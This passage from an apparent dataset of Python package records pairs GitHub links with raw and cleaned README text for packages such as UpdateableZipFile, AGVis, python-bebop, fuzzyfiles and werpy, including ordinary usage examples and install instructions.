## References

- [Latest Release](https://github.com/alipay/antchain-openapi-prod-sdk/tree/master/python)

## License

[Apache-2.0](http://www.apache.org/licenses/LICENSE-2.0)

Copyright (c) 2009-present, Alibaba Cloud All rights reserved.


",alipay/antchain-openapi-prod-sdk
jurebes,https://github.com/OpenVoiceOS/jurebes,5,0,0,,,openvoiceos/jurebes
updateable-zip-file,https://github.com/michaelvanstraten/updateable-zip-file,0,1230,1230,"# UpdateableZipFile

`UpdateableZipFile` is a simple python package base on a stack [overflow answer](https://stackoverflow.com/a/35435548).

It implements a single class, `UpdateableZipFile`, that builds on top of the standart library `ZipFile`,
which allows user to update files inside a zip archive with ease.

## Example

```python
from updateablezipfile import UpdateableZipFile

with UpdateableZipFile(""C:\Temp\Test2.docx"", ""a"") as o:
    # Overwrite a file with a string
    o.writestr(""word/document.xml"", ""Some data"")
    # exclude an exiting file from the zip
    o.remove_file(""word/fontTable.xml"")
    # Write a new file (with no conflict) to the zp
    o.writestr(""new_file"", ""more data"")
    # Overwrite a file with a file
    o.write(r""C:\Temp\example.png"", ""word/settings.xml"")
```

## Attribution

The implementation is was in no way or form written by me,
it is thanks to [Or Weis](https://stackoverflow.com/users/2899910/or-weis) answer on stack overflow.

As of my knowledge this is code is under the `Creative Commons` license,
based on the terms and conditions of stack overflow.

If you are the original author of the underlying implementation
please contact me and i will transfer the package over to you.
","# UpdateableZipFile

`UpdateableZipFile` is a simple python package base on a stack [overflow answer](https://stackoverflow.com/a/35435548).

It implements a single class, `UpdateableZipFile`, that builds on top of the standart library `ZipFile`,
which allows user to update files inside a zip archive with ease.

## Example

```python
from updateablezipfile import UpdateableZipFile

with UpdateableZipFile(""C:\Temp\Test2.docx"", ""a"") as o:
    # Overwrite a file with a string
    o.writestr(""word/document.xml"", ""Some data"")
    # exclude an exiting file from the zip
    o.remove_file(""word/fontTable.xml"")
    # Write a new file (with no conflict) to the zp
    o.writestr(""new_file"", ""more data"")
    # Overwrite a file with a file
    o.write(r""C:\Temp\example.png"", ""word/settings.xml"")
```

## Attribution

The implementation is was in no way or form written by me,
it is thanks to [Or Weis](https://stackoverflow.com/users/2899910/or-weis) answer on stack overflow.

As of my knowledge this is code is under the `Creative Commons` license,
based on the terms and conditions of stack overflow.

If you are the original author of the underlying implementation
please contact me and i will transfer the package over to you.
",michaelvanstraten/updateable-zip-file
agvis,https://github.com/CURENT/agvis,36,2816,2701,"# LTB AGVis

<img src=""docs/source/images/sponsors/CURENT_Logo_NameOnTrans.png"" alt=""CURENT ERC Logo"" width=""300"" height=""auto"">

Geographical visualizer for energy system.

|               | Latest                                                                                                                                        | Stable                                                                                                                                        |
|---------------|-----------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|
| Documentation | [![Latest Documentation](https://readthedocs.org/projects/agvis/badge/?version=stable)](https://agvis.readthedocs.io/en/latest/?badge=stable) | [![Documentation Status](https://readthedocs.org/projects/agvis/badge/?version=latest)](https://agvis.readthedocs.io/en/latest/?badge=latest)|

# Why AGVis

AGVis is a geovisualization tool that facilitates the visualization of ***large-scale real-time*** power system simulation.

AGVis visualizing the entire North America system topology:

![image](https://user-images.githubusercontent.com/79226045/203147395-27561028-4a74-4ac1-91a5-01e7f811f898.png)

AGVis visualizing the WECC system:

![image](https://user-images.githubusercontent.com/79226045/203148756-edc046a3-35a1-4343-8ab2-67cfa337546c.png)

# Quick Start

AGVis runs on Linux or Windows, a quick start guide is available at [Quick Start](https://agvis.readthedocs.io/en/latest/quick_start/quick_start/)

# Citing AGVis

If you use AGVis for research or consulting, please cite the following publications in your publication:

> Parsly, N., Wang, J., West, N., Zhang, Q., Cui, H., & Li, F. (2022). ""DiME and AGVIS A Distributed Messaging Environment and Geographical Visualizer for Large-scale Power System Simulation"". arXiv. https://doi.org/https://arxiv.org/abs/2211.11990v1

Please refer as **LTB AGVis** for the first occurence and then refer as **AGVis**.

# Sponsors and Contributors
This work was supported in part by the Engineering Research Center
Program of the National Science Foundation and the Department of Energy
under NSF Award Number EEC-1041877 and the CURENT Industry Partnership
Program.

This work was supported in part by the Advanced Grid Research and Development Program
in the Office of Electricity at the U.S. Department of Energy.

AGVis is originally developed by Nicholas West and currently developed and maintained by Nicholas Parsly.

See [GitHub contributors][GitHub contributors] for the contributor list.

# License

AGVis is licensed under [GPL v3 License](./LICENSE)
","# LTB AGVis



Geographical visualizer for energy system.

|               | Latest                                                                                                                                        | Stable                                                                                                                                        |
|---------------|-----------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|
| Documentation | [![Latest Documentation](https://readthedocs.org/projects/agvis/badge/?version=stable)](https://agvis.readthedocs.io/en/latest/?badge=stable) | [![Documentation Status](https://readthedocs.org/projects/agvis/badge/?version=latest)](https://agvis.readthedocs.io/en/latest/?badge=latest)|

# Why AGVis

AGVis is a geovisualization tool that facilitates the visualization of ***large-scale real-time*** power system simulation.

AGVis visualizing the entire North America system topology:

![image](https://user-images.githubusercontent.com/79226045/203147395-27561028-4a74-4ac1-91a5-01e7f811f898.png)

AGVis visualizing the WECC system:

![image](https://user-images.githubusercontent.com/79226045/203148756-edc046a3-35a1-4343-8ab2-67cfa337546c.png)

# Quick Start

AGVis runs on Linux or Windows, a quick start guide is available at [Quick Start](https://agvis.readthedocs.io/en/latest/quick_start/quick_start/)

# Citing AGVis

If you use AGVis for research or consulting, please cite the following publications in your publication:

> Parsly, N., Wang, J., West, N., Zhang, Q., Cui, H., & Li, F. (2022). ""DiME and AGVIS A Distributed Messaging Environment and Geographical Visualizer for Large-scale Power System Simulation"". arXiv. https://doi.org/https://arxiv.org/abs/2211.11990v1

Please refer as **LTB AGVis** for the first occurence and then refer as **AGVis**.

# Sponsors and Contributors
This work was supported in part by the Engineering Research Center
Program of the National Science Foundation and the Department of Energy
under NSF Award Number EEC-1041877 and the CURENT Industry Partnership
Program.

This work was supported in part by the Advanced Grid Research and Development Program
in the Office of Electricity at the U.S. Department of Energy.

AGVis is originally developed by Nicholas West and currently developed and maintained by Nicholas Parsly.

See [GitHub contributors][GitHub contributors] for the contributor list.

# License

AGVis is licensed under [GPL v3 License](./LICENSE)
",curent/agvis
python-bebop,https://github.com/betwixt-labs/bebop,0,380,380,"# Python bebop

Bebop is a schema-based binary serialization technology, similar to Protocol Buffers or MessagePack. In particular, Bebop tries to be a good fit for client–server or distributed web apps that need something faster, more concise, and more type-safe than JSON or MessagePack, while also avoiding some of the complexity of Protocol Buffers, FlatBuffers and the like.
","# Python bebop

Bebop is a schema-based binary serialization technology, similar to Protocol Buffers or MessagePack. In particular, Bebop tries to be a good fit for client–server or distributed web apps that need something faster, more concise, and more type-safe than JSON or MessagePack, while also avoiding some of the complexity of Protocol Buffers, FlatBuffers and the like.
",betwixt-labs/bebop
fuzzyfiles,https://github.com/hansalemaos/fuzzyfiles,5,9637,9637,"# Binary fuzzy matching in all file types [fzf (pre-filter)/rapidfuzz (finds the best result)]

### Tested against Windows 10 / Python 3.10 / Anaconda


#### pip install fuzzyfiles



Download FZF: https://github.com/junegunn/fzf 

PIP Install: https://github.com/maxbachmann/RapidFuzz
(Visual C++ 2019 redistributable is required)


```python

# IMPORTANT: 	The script must be inside a py file, it does not work directly from the console!

from list_all_files_recursively import get_folder_file_complete_path
from fuzzyfiles import fuzzy_file_search

fzf_path = r""C:\fzf.exe""
querylist = [
    ""Es war einmal"",
    ""Was machst du?"",
    ""Wir mÃ¼ssen hierbleiben!"",
    ""Er kaufte ein Haus"",
]

files = [x.path for x in get_folder_file_complete_path(r""E:\meinebuecher"")]
df = fuzzy_file_search(
    querylist,
    files,
    fzf_path,
    fzfargs=(""-i"",),
    shell=False,
    close_fds=False,
    start_new_session=True,
    bufsize=8192 * 10,
    invisible=True,
    timeout=60,
    max_threads=None,
    timeout_check_sleep=3,
    kill_all_at_end=True,
    blockbatch=False,
)

print(files)

print(df.to_string(max_colwidth=40))


# ['E:\\\\meinebuecher\\\\Adorf_Mario_Der_Dieb_von_Trastevere_Geschichten_aus_Italien1.txt', 'E:\\\\meinebuecher\\\\Adorf_Mario_Der_Dieb_von_Trastevere_Geschichten_aus_Italien10000000.pkl', 'E:\\\\meinebuecher\\\\Adorf_Mario_Der_MÃ¤usetÃ¶ter_UnrÃ¼hmliche_Geschichten1.txt', 'E:\\\\meinebuecher\\\\Adorf_Mario_Himmel_und_Erde_Unordentliche_Erinnerungen.txt', 'E:\\\\meinebuecher\\\\Ad_Daula_al_Islxmxya_TodenhÃ¶fer_Jxrgen_Inside_IS_10_Tage_im_Islamischen_Staat_.txt', 'E:\\\\meinebuecher\\\\Allan_Pease_Barbara_Pease_Warum_Manner_nicht_zuhoren_und_Frauen_schlecht_einparken.pdf', 'E:\\\\meinebuecher\\\\Andreas_Eschbach_Eine_Trillion_Euro.pdf', 'E:\\\\meinebuecher\\\\Andreas_Meier_Henrik_Stormer_eBusiness_eCommerce_Management_der_digitalen_WertschÃ¶pfungskette_1Auflage.pdf', 'E:\\\\meinebuecher\\\\Arthur_Hailey_Hotel.pdf']
#                        searchbinsplit      score                          searchbin                             match_detail                                 filepath                                    match  src_start  src_end  dest_start  dest_end             searchstring stderr  returncode
# 0                   b'Was machst du?'  71.428571                  b'Was machst du?'                     b'\\\\xbbWas hast du d'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Sam packte seinen Koffer, ging dan...       4222     4236           0        14           Was machst du?    b''           0
# 1   b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  70.833333  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'        b'r. Wir m\\\\xc3\\\\xbcssen leider no'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Enrico war in Florenz geblieben, u...      17192    17216           0        24  Wir mÃ¼ssen hierbleiben!    b''           0
# 2                    b'Es war einmal'  76.923077                   b'Es war einmal'                      b'\\\\x00Es war eine '  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'\\\\xc2\\\\xbbWieso k\\\\xc3\\\\xb6nnen Sie be...     131842   131855           0        13            Es war einmal    b''           0
# 3               b'Er kaufte ein Haus'  72.222222              b'Er kaufte ein Haus'                    b'hler hat kein Haus'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Eines Nachts h\\\\xc3\\\\xb6rte ich ein ...       5351     5369           0        18       Er kaufte ein Haus    b''           0
# 4                   b'Was machst du?'  42.857143                  b'Was machst du?'                        b""anders', 'Nach""  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Filmfestsp\\\\xc3\\\\xb6\\\\xc3\\\\xaeIele\\\\xc3...      23968    23982           0        14           Was machst du?    b''           0
# 5   b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  54.166667  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'           b'gisseur von Diebe haben\\\\xc3'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Ndherberge\\\\xc3\\\\xb6\\\\xc3\\\\xa7\\\\xc3\\\\xb6...       7513     7537           0        24  Wir mÃ¼ssen hierbleiben!    b''           0
# 6                    b'Es war einmal'  76.923077                   b'Es war einmal'                         b's waren damal'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'/./&/ \\\\xc3\\\\xb6hjM\\\\xc2\\\\xa4\\\\xc5\\\\xaf\...       2883     2896           0        13            Es war einmal    b''           0
# 7               b'Er kaufte ein Haus'  61.111111              b'Er kaufte ein Haus'                    b'raf ich auf ein ga'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'/./&/ \\\\xc3\\\\xb6hjM\\\\xc2\\\\xa4\\\\xc5\\\\xaf\...       5835     5853           0        18       Er kaufte ein Haus    b''           0
# 8                   b'Was machst du?'  71.428571                  b'Was machst du?'                        b'l brauchst du?'  E:\meinebuecher\Adorf_Mario_Der_MÃ¤us...  b'In jenen Tagen war meine Miete \\\\xc...       1398     1412           0        14           Was machst du?    b''           0
# 9   b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  62.500000  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  b'inute hierbleiben \\\\xe2\\\\x80\\\\xa6!\\\\xc...  E:\meinebuecher\Adorf_Mario_Der_MÃ¤us...  b'Bis weit in den achten Monat hinei...       1476     1500           0        24  Wir mÃ¼ssen hierbleiben!    b''           0
# 10                   b'Es war einmal'  76.923077                   b'Es war einmal'                         b' wir einmal e'  E:\meinebuecher\Adorf_Mario_Der_MÃ¤us...  b'Und es folgte unweigerlich eine br...      60416    60429           0        13            Es war einmal    b''           0
# 11              b'Er kaufte ein Haus'  72.222222              b'Er kaufte ein Haus'                    b' Er hatte in Hambu'  E:\meinebuecher\Adorf_Mario_Der_MÃ¤us...  b'Zwei Monate sp\\\\xc3\\\\xa4ter war er t...      87656    87674           0        18       Er kaufte ein Haus    b''           0
# 12                  b'Was machst du?'  92.857143                  b'Was machst du?'                     b'\\\\xbbWas machst du'  E:\meinebuecher\Adorf_Mario_Himmel_u...  b""Mein Freund Peter Berling rief mic...         41       55           0        14           Was machst du?    b''           0
# 13  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  62.500000  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'        b'e m\\\\xc3\\\\xbcssen mir nun zeigen'  E:\meinebuecher\Adorf_Mario_Himmel_u...  b""Der franz\\\\xc3\\\\xb6sische Regisseur ...      42156    42180           0        24  Wir mÃ¼ssen hierbleiben!    b''           0
# 14                   b'Es war einmal'  92.307692                   b'Es war einmal'                         b'Es war ein al'  E:\meinebuecher\Adorf_Mario_Himmel_u...  b""Ich wachte auf, als das Telefon l\...     120432   120445           0        13            Es war einmal    b''           0
# 15              b'Er kaufte ein Haus'  72.222222              b'Er kaufte ein Haus'                    b'ur auf meine Hands'  E:\meinebuecher\Adorf_Mario_Himmel_u...  b""Wodka konnte man auch ganz legal i...     260770   260788           0        18       Er kaufte ein Haus    b''           0


    Args:
        querylist (list): List of queries to search for.

            Token	     Match type					        Description
            sbtrkt	     fuzzy-match				        Items that match sbtrkt
            'wild	     exact-match (quoted)		        Items that include wild
            ^music	     prefix-exact-match			        Items that start with music
            .mp3$	     suffix-exact-match			        Items that end with .mp3
            !fire	     inverse-exact-match		        Items that do not include fire
            !^music	     inverse-prefix-exact-match	        Items that do not start with music
            !.mp3$	     inverse-suffix-exact-match	        Items that do not end with .mp3

            A single bar character term acts as an OR operator. For example, the following query matches entries that
             start with core and end with either go, rb, or py.

            ^core go$ | rb$ | py$
            VERY IMPORTANT: ---- SPACE BEFORE and AFTER the single bar character term

            More information here: https://github.com/junegunn/fzf


        files (str | list | tuple): Path(s) to file(s) to search in.
        fzf_path (str, optional): Path to the fzf executable. Defaults to ""fzf.exe"".
        fzfargs (tuple, optional): Additional arguments to pass to fzf. Defaults to (""-i"",).
        shell (bool, optional): Whether to use a shell to execute the command. Defaults to False.
        close_fds (bool, optional): Whether to close file descriptors. Defaults to False.
        start_new_session (bool, optional): Whether to start a new session. Defaults to True.
        bufsize (int, optional): Buffer size. Defaults to 8192 * 4.
        invisible (bool, optional): Whether to run the command invisibly (no window). Defaults to True.
        timeout (int, optional): Timeout in seconds. Defaults to 60.
        max_threads (int | None, optional): Maximum number of threads to use. Defaults to None (number of CPUs).
        timeout_check_sleep (int | float, optional): Time to sleep between timeout checks. Defaults to 3.
        kill_all_at_end (bool, optional): Whether to kill all not finished processes at the end. Defaults to True.
        blockbatch (bool, optional): Whether to block batch processing. Defaults to False.

    Returns:
        pd.DataFrame: A dataframe containing the search results.

```
","# Binary fuzzy matching in all file types [fzf (pre-filter)/rapidfuzz (finds the best result)]

### Tested against Windows 10 / Python 3.10 / Anaconda


#### pip install fuzzyfiles



Download FZF: https://github.com/junegunn/fzf 

PIP Install: https://github.com/maxbachmann/RapidFuzz
(Visual C++ 2019 redistributable is required)


```python

# IMPORTANT: 	The script must be inside a py file, it does not work directly from the console!

from list_all_files_recursively import get_folder_file_complete_path
from fuzzyfiles import fuzzy_file_search

fzf_path = r""C:\fzf.exe""
querylist = [
    ""Es war einmal"",
    ""Was machst du?"",
    ""Wir mÃ¼ssen hierbleiben!"",
    ""Er kaufte ein Haus"",
]

files = [x.path for x in get_folder_file_complete_path(r""E:\meinebuecher"")]
df = fuzzy_file_search(
    querylist,
    files,
    fzf_path,
    fzfargs=(""-i"",),
    shell=False,
    close_fds=False,
    start_new_session=True,
    bufsize=8192 * 10,
    invisible=True,
    timeout=60,
    max_threads=None,
    timeout_check_sleep=3,
    kill_all_at_end=True,
    blockbatch=False,
)

print(files)

print(df.to_string(max_colwidth=40))


# ['E:\\\\meinebuecher\\\\Adorf_Mario_Der_Dieb_von_Trastevere_Geschichten_aus_Italien1.txt', 'E:\\\\meinebuecher\\\\Adorf_Mario_Der_Dieb_von_Trastevere_Geschichten_aus_Italien10000000.pkl', 'E:\\\\meinebuecher\\\\Adorf_Mario_Der_MÃ¤usetÃ¶ter_UnrÃ¼hmliche_Geschichten1.txt', 'E:\\\\meinebuecher\\\\Adorf_Mario_Himmel_und_Erde_Unordentliche_Erinnerungen.txt', 'E:\\\\meinebuecher\\\\Ad_Daula_al_Islxmxya_TodenhÃ¶fer_Jxrgen_Inside_IS_10_Tage_im_Islamischen_Staat_.txt', 'E:\\\\meinebuecher\\\\Allan_Pease_Barbara_Pease_Warum_Manner_nicht_zuhoren_und_Frauen_schlecht_einparken.pdf', 'E:\\\\meinebuecher\\\\Andreas_Eschbach_Eine_Trillion_Euro.pdf', 'E:\\\\meinebuecher\\\\Andreas_Meier_Henrik_Stormer_eBusiness_eCommerce_Management_der_digitalen_WertschÃ¶pfungskette_1Auflage.pdf', 'E:\\\\meinebuecher\\\\Arthur_Hailey_Hotel.pdf']
#                        searchbinsplit      score                          searchbin                             match_detail                                 filepath                                    match  src_start  src_end  dest_start  dest_end             searchstring stderr  returncode
# 0                   b'Was machst du?'  71.428571                  b'Was machst du?'                     b'\\\\xbbWas hast du d'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Sam packte seinen Koffer, ging dan...       4222     4236           0        14           Was machst du?    b''           0
# 1   b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  70.833333  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'        b'r. Wir m\\\\xc3\\\\xbcssen leider no'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Enrico war in Florenz geblieben, u...      17192    17216           0        24  Wir mÃ¼ssen hierbleiben!    b''           0
# 2                    b'Es war einmal'  76.923077                   b'Es war einmal'                      b'\\\\x00Es war eine '  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'\\\\xc2\\\\xbbWieso k\\\\xc3\\\\xb6nnen Sie be...     131842   131855           0        13            Es war einmal    b''           0
# 3               b'Er kaufte ein Haus'  72.222222              b'Er kaufte ein Haus'                    b'hler hat kein Haus'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Eines Nachts h\\\\xc3\\\\xb6rte ich ein ...       5351     5369           0        18       Er kaufte ein Haus    b''           0
# 4                   b'Was machst du?'  42.857143                  b'Was machst du?'                        b""anders', 'Nach""  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Filmfestsp\\\\xc3\\\\xb6\\\\xc3\\\\xaeIele\\\\xc3...      23968    23982           0        14           Was machst du?    b''           0
# 5   b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  54.166667  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'           b'gisseur von Diebe haben\\\\xc3'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'Ndherberge\\\\xc3\\\\xb6\\\\xc3\\\\xa7\\\\xc3\\\\xb6...       7513     7537           0        24  Wir mÃ¼ssen hierbleiben!    b''           0
# 6                    b'Es war einmal'  76.923077                   b'Es war einmal'                         b's waren damal'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'/./&/ \\\\xc3\\\\xb6hjM\\\\xc2\\\\xa4\\\\xc5\\\\xaf\...       2883     2896           0        13            Es war einmal    b''           0
# 7               b'Er kaufte ein Haus'  61.111111              b'Er kaufte ein Haus'                    b'raf ich auf ein ga'  E:\meinebuecher\Adorf_Mario_Der_Dieb...  b'/./&/ \\\\xc3\\\\xb6hjM\\\\xc2\\\\xa4\\\\xc5\\\\xaf\...       5835     5853           0        18       Er kaufte ein Haus    b''           0
# 8                   b'Was machst du?'  71.428571                  b'Was machst du?'                        b'l brauchst du?'  E:\meinebuecher\Adorf_Mario_Der_MÃ¤us...  b'In jenen Tagen war meine Miete \\\\xc...       1398     1412           0        14           Was machst du?    b''           0
# 9   b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  62.500000  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  b'inute hierbleiben \\\\xe2\\\\x80\\\\xa6!\\\\xc...  E:\meinebuecher\Adorf_Mario_Der_MÃ¤us...  b'Bis weit in den achten Monat hinei...       1476     1500           0        24  Wir mÃ¼ssen hierbleiben!    b''           0
# 10                   b'Es war einmal'  76.923077                   b'Es war einmal'                         b' wir einmal e'  E:\meinebuecher\Adorf_Mario_Der_MÃ¤us...  b'Und es folgte unweigerlich eine br...      60416    60429           0        13            Es war einmal    b''           0
# 11              b'Er kaufte ein Haus'  72.222222              b'Er kaufte ein Haus'                    b' Er hatte in Hambu'  E:\meinebuecher\Adorf_Mario_Der_MÃ¤us...  b'Zwei Monate sp\\\\xc3\\\\xa4ter war er t...      87656    87674           0        18       Er kaufte ein Haus    b''           0
# 12                  b'Was machst du?'  92.857143                  b'Was machst du?'                     b'\\\\xbbWas machst du'  E:\meinebuecher\Adorf_Mario_Himmel_u...  b""Mein Freund Peter Berling rief mic...         41       55           0        14           Was machst du?    b''           0
# 13  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'  62.500000  b'Wir m\\\\xc3\\\\xbcssen hierbleiben!'        b'e m\\\\xc3\\\\xbcssen mir nun zeigen'  E:\meinebuecher\Adorf_Mario_Himmel_u...  b""Der franz\\\\xc3\\\\xb6sische Regisseur ...      42156    42180           0        24  Wir mÃ¼ssen hierbleiben!    b''           0
# 14                   b'Es war einmal'  92.307692                   b'Es war einmal'                         b'Es war ein al'  E:\meinebuecher\Adorf_Mario_Himmel_u...  b""Ich wachte auf, als das Telefon l\...     120432   120445           0        13            Es war einmal    b''           0
# 15              b'Er kaufte ein Haus'  72.222222              b'Er kaufte ein Haus'                    b'ur auf meine Hands'  E:\meinebuecher\Adorf_Mario_Himmel_u...  b""Wodka konnte man auch ganz legal i...     260770   260788           0        18       Er kaufte ein Haus    b''           0


    Args:
        querylist (list): List of queries to search for.

            Token	     Match type					        Description
            sbtrkt	     fuzzy-match				        Items that match sbtrkt
            'wild	     exact-match (quoted)		        Items that include wild
            ^music	     prefix-exact-match			        Items that start with music
            .mp3$	     suffix-exact-match			        Items that end with .mp3
            !fire	     inverse-exact-match		        Items that do not include fire
            !^music	     inverse-prefix-exact-match	        Items that do not start with music
            !.mp3$	     inverse-suffix-exact-match	        Items that do not end with .mp3

            A single bar character term acts as an OR operator. For example, the following query matches entries that
             start with core and end with either go, rb, or py.

            ^core go$ | rb$ | py$
            VERY IMPORTANT: ---- SPACE BEFORE and AFTER the single bar character term

            More information here: https://github.com/junegunn/fzf


        files (str | list | tuple): Path(s) to file(s) to search in.
        fzf_path (str, optional): Path to the fzf executable. Defaults to ""fzf.exe"".
        fzfargs (tuple, optional): Additional arguments to pass to fzf. Defaults to (""-i"",).
        shell (bool, optional): Whether to use a shell to execute the command. Defaults to False.
        close_fds (bool, optional): Whether to close file descriptors. Defaults to False.
        start_new_session (bool, optional): Whether to start a new session. Defaults to True.
        bufsize (int, optional): Buffer size. Defaults to 8192 * 4.
        invisible (bool, optional): Whether to run the command invisibly (no window). Defaults to True.
        timeout (int, optional): Timeout in seconds. Defaults to 60.
        max_threads (int | None, optional): Maximum number of threads to use. Defaults to None (number of CPUs).
        timeout_check_sleep (int | float, optional): Time to sleep between timeout checks. Defaults to 3.
        kill_all_at_end (bool, optional): Whether to kill all not finished processes at the end. Defaults to True.
        blockbatch (bool, optional): Whether to block batch processing. Defaults to False.

    Returns:
        pd.DataFrame: A dataframe containing the search results.

```
",hansalemaos/fuzzyfiles
werpy,https://github.com/analyticsinmotion/werpy,3,6871,6077,"
![werpy-logo-word-error-rate](https://user-images.githubusercontent.com/52817125/235063664-2f21629c-0fad-46b6-a487-c2b5ef6f80e9.png)
# werpy - Word Error Rate for Python
<!-- badges: start -->
[![Python Version](https://img.shields.io/badge/python-3.8%7C3.9%7C3.10%7C3.11-blue?logo=python&logoColor=ffdd54)](https://www.python.org/downloads/)&nbsp;&nbsp;
[![werpy License](https://img.shields.io/badge/License-BSD_3--Clause-blue.svg)](https://github.com/analyticsinmotion/werpy/blob/main/LICENSE)&nbsp;&nbsp;
![Maintained](https://img.shields.io/badge/Maintained%3F-yes-green.svg)&nbsp;&nbsp;
<!-- badges: end -->

## What is it?
**werpy** is a powerful yet lightweight Python package that rapidly calculates and analyzes the Word Error Rate (WER) between two sets of text. 
It has been designed with the flexibility to handle multiple input data types such as strings, lists and numpy arrays.<br />

The package also includes a full set of features such as normalizing the input text to account for data collection variability and the capability to easily assign different weights/penalties to specific error classifications (insertions, deletions, and substitutions).
Additionally, the summary function provides a comprehensive breakdown of the calculated results to assist in analyzing the specific errors quickly and in more detail.
<br />

## Installation
You can install the latest **werpy** release with Python's pip package manager:

```python
# install werpy via PyPi
pip install werpy
```

## Main Functions
The following table provides an overview of the functions that can be used in werpy.

| Function  | Description | 
| ------------- | ------------- |
| normalize(text)  | Preprocess input text to remove punctuation, remove duplicated spaces, leading/trailing blanks and convert all words to lowercase. |
| wer(reference, hypothesis)  | Calculate the overall Word Error Rate for the entire reference and hypothesis texts. |
| wers(reference, hypothesis)  | Calculates a list of the Word Error Rates for each of the reference and hypothesis texts. |
| werp(reference, hypothesis)  | Calculates a weighted Word Error Rate for the entire reference and hypothesis texts. |
| werps(reference, hypothesis)  | Calculates a list of weighted Word Error Rates for each of the reference and hypothesis texts. |
| summary(reference, hypothesis)  | Provides a comprehensive breakdown of the calculated results including the WER, Levenshtein Distance and all the insertion, deletion and substitution errors. |


## Usage
**Import the werpy package**
```python
>>> import werpy
```

**Example 1 - Normalize a list of text**
```python
>>> input_data = [""It's very popular in Antarctica."",""The Sugar Bear character""]
>>> reference = werpy.normalize(input_data)
>>> print(reference)
['its very popular in antarctica', 'the sugar bear character']
```

**Example 2 - Calculate the overall Word Error Rate on a set of strings**
```python
>>> wer = werpy.wer('i love cold pizza', 'i love pizza')
>>> print(wer)
0.25
```

**Example 3 - Calculate the overall Word Error Rate on a set of lists**
```python
>>> ref = ['i love cold pizza','the sugar bear character was popular']
>>> hyp = ['i love pizza','the sugar bare character was popular']
>>> wer = werpy.wer(ref, hyp)
>>> print(wer)
0.2
```

**Example 4 - Calculate the Word Error Rates for each set of texts**
```python
>>> ref = ['no one else could claim that','she cited multiple reasons why']
>>> hyp = ['no one else could claim that','she sighted multiple reasons why']
>>> wers = werpy.wers(ref, hyp)
>>> print(wers)
[0.0, 0.2]
```

**Example 5 - Calculate the weighted Word Error Rates for the entire set of text**
```python
>>> ref = ['it was beautiful and sunny today']
>>> hyp = ['it was a beautiful and sunny day']
>>> werp = werpy.werp(ref, hyp, insertions_weight=0.5, deletions_weight=0.5, substitutions_weight=1)
>>> print(werp)
0.25
```

**Example 6 - Calculate a list of weighted Word Error Rates for each of the reference and hypothesis texts**
```python
>>> ref = ['it blocked sight lines of central park', 'her father was an alderman in the city government']
>>> hyp = ['it blocked sightlines of central park', 'our father was an elder man in the city government']
>>> werps = werpy.werps(ref, hyp, insertions_weight = 0.5, deletions_weight = 0.5, substitutions_weight = 1)
>>> print(werps)
[0.21428571428571427, 0.2777777777777778]
```

**Example 7 - Provide a complete breakdown of the Word Error Rate calculations for each of the reference and hypothesis texts**
```python
>>> ref = ['it is consumed domestically and exported to other countries', 'rufino street in makati right inside the makati central business district', 'its estuary is considered to have abnormally low rates of dissolved oxygen', 'he later cited his first wife anita as the inspiration for the song', 'no one else could claim that']
>>> hyp = ['it is consumed domestically and exported to other countries', 'rofino street in mccauti right inside the macasi central business district', 'its estiary is considered to have a normally low rates of dissolved oxygen', 'he later sighted his first wife anita as the inspiration for the song', 'no one else could claim that']
>>> summary = werpy.summary(ref, hyp)
>>> print(summary)
```
<!-- <img src="".github/assets/images/werpy-example-summary-results-word-error-rate-breakdown.png"" width=100% height=100%> -->
<!-- <img src=""https://github.com/analyticsinmotion/werpy/blob/main/.github/assets/images/werpy-example-summary-results-word-error-rate-breakdown.png"" width=100% height=100%> -->
<!-- ![werpy summary DataFrame](.github/assets/images/werpy-example-summary-results-word-error-rate-breakdown.png)-->

![werpy-example-summary-results-word-error-rate-breakdown](https://user-images.githubusercontent.com/52817125/234950114-7efcce9b-7a76-4413-830f-7deda20cad75.png)



## Dependencies
 - <a href=""https://www.numpy.org"">NumPy</a> - Provides an assortment of routines for fast operations on arrays
 - <a href=""https://pandas.pydata.org/"">Pandas</a> - Powerful data structures for data analysis, time series, and statistics

## Licensing

``werpy`` is released under the terms of the BSD 3-Clause License. Please refer to the LICENSE file for full details.

This project also includes third-party packages distributed under the BSD-3-Clause license, including NumPy and Pandas.

The full NumPy and Pandas licenses can be found in the <a href=""https://github.com/analyticsinmotion/werpy/tree/main/LICENSES"">LICENSES</a> directory in this repository. 

They can also be found directly in the following source codes:

 - NumPy - <a href=""https://github.com/numpy/numpy/blob/main/LICENSE.txt"">https://github.com/numpy/numpy/blob/main/LICENSE.txt</a>
 - Pandas - <a href=""https://github.com/pandas-dev/pandas/blob/main/LICENSE"">https://github.com/pandas-dev/pandas/blob/main/LICENSE</a>

","
